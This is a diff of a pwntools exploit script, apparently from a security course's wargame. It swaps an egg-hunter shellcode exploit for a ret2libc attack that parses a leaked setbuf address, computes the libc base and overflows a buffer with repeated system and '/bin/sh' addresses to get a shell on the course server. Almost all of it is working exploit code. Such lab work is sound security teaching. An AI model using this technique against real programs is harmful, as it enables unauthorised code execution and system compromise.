@@ -6,16 +6,17 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 context.update(arch='i386')
-exe = './find-me' #Change this
+exe = './ret2libc' #Change this
 
 PROGNAME = exe
 REMOTE = "comp6447.wtf" #Change this
-REMOTEPORT = 24973 #Change this
+REMOTEPORT = 29471 #Change this
 global p
 global e
 global global_timeout
 
 e = ELF(PROGNAME)
+
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -40,61 +41,35 @@ continue
 if args.REMOTE:
     global_timeout = 3
     p = remote(REMOTE, REMOTEPORT)
+    libc = ELF('./libc-2.23.so')
 else:
     global_timeout = 0.5
     p = process(PROGNAME)
     p = start()
+    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
-# The first four instructions are equivalent to 0x4f904790.
-# This is our egg.
+p.recvuntil(b'- ',drop=True)
+setbuf_leak = p.recvline()
+setbuf_leak = setbuf_leak[:-3]
+setbuf_leak = int(setbuf_leak, 16)
+log.info(f"setbuf is at: {hex(setbuf_leak)}")
+p.recvline()
 
-# Egg hunter
-small_assembly = """
-_start:
-mov edx, 0x4f904790
-loop:
-inc eax
-cmp dword ptr [eax], edx
-jne loop
-jmp eax
-"""
+setbuf_offset = libc.symbols["setbuf"] #0x52900
+libc.address = setbuf_leak - setbuf_offset
+log.info(f"base libc address: {hex(libc.address)}")
+libc_system = libc.symbols["system"]
+libc_binsh = next(libc.search(b'/bin/sh\00'))
+assert(libc_binsh is not None)
+return_addr_junk = p32(0)
 
-# Egg + Shellcode
-large_assembly = """
-nop
-inc edi
-nop
-dec edi
+# buffer at ebp-4ce
 
-xor ecx, ecx
-mul ecx
+payload = (p32(libc_system) + return_addr_junk + p32(libc_binsh)) *0x65
+payload += b'\x00'*14
 
-sub esp, 400
-mov ecx, esp
-mov ebx, 1000
-mov eax, 0x3
-mov edx, 0xFF
-int 0x80
-
-mov eax, 0x4
-mov ebx, 0x1
-int 0x80
-
-mov eax, 0x1
-int 0x80
-"""
-
-
-
-small_asm = asm(small_assembly)
-large_asm = asm(large_assembly)
-
-p.recvuntil(b'smallbuf shellcode', drop=True)
-p.sendline(small_asm)
-p.recvuntil(b'bigbuf shellcode:', drop=True)
-p.sendline(large_asm)
-
+p.sendline(payload)
 p.interactive()
 
